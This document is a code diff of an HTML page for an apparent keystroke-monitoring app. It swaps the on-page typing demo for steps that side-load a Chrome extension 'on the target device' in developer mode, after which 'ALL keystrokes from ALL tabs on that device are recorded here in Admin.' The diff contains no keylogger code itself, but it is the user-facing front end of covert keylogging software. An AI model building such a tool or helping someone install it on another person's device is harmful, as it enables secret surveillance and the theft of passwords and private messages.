@@ -175,40 +175,47 @@
           <button id="resetBtn" class="btn-reset">Reset Device</button>
         </div>
 
-        <!-- Instructions Card -->
+        <!-- Extension Setup Card -->
         <div class="instructions-card">
           <div class="instructions-header">
             <div class="instructions-icon">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <circle cx="12" cy="12" r="10"/>
-                <path d="M12 16v-4M12 8h.01"/>
+                <rect x="2" y="3" width="20" height="14" rx="2"/>
+                <path d="M8 21h8M12 17v4"/>
               </svg>
             </div>
             <div>
-              <h3>How It Works</h3>
-              <p>Simple 3-step monitoring setup</p>
+              <h3>Chrome Extension Setup</h3>
+              <p>Install on any device to monitor ALL browser tabs</p>
             </div>
           </div>
           <div class="steps">
             <div class="step">
               <div class="step-num">1</div>
               <div class="step-content">
-                <h4>Click Start Monitoring</h4>
-                <p>Click the button in the popup to begin tracking</p>
+                <h4>Open Chrome Extensions</h4>
+                <p>On the target device, open Chrome and go to <strong>chrome://extensions/</strong></p>
               </div>
             </div>
             <div class="step">
               <div class="step-num">2</div>
               <div class="step-content">
-                <h4>Type Anywhere on This Page</h4>
-                <p>All keystrokes are captured automatically</p>
+                <h4>Enable Developer Mode</h4>
+                <p>Toggle <strong>"Developer mode"</strong> ON in the top-right corner</p>
               </div>
             </div>
             <div class="step">
               <div class="step-num">3</div>
               <div class="step-content">
-                <h4>View in Admin Dashboard</h4>
-                <p>Click Admin button, enter password to view all data</p>
+                <h4>Load the Extension</h4>
+                <p>Click <strong>"Load unpacked"</strong> and select the <code>extension</code> folder from this project</p>
+              </div>
+            </div>
+            <div class="step">
+              <div class="step-num">4</div>
+              <div class="step-content">
+                <h4>Click Start Monitoring</h4>
+                <p>Click the extension icon in the toolbar, then press <strong>"Start Monitoring"</strong></p>
               </div>
             </div>
           </div>
@@ -217,7 +224,7 @@
               <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
               <polyline points="22 4 12 14.01 9 11.01"/>
             </svg>
-            <span>Data saves automatically - works even after refresh!</span>
+            <span>After setup, ALL keystrokes from ALL tabs on that device are recorded here in Admin.</span>
           </div>
         </div>
       </div>
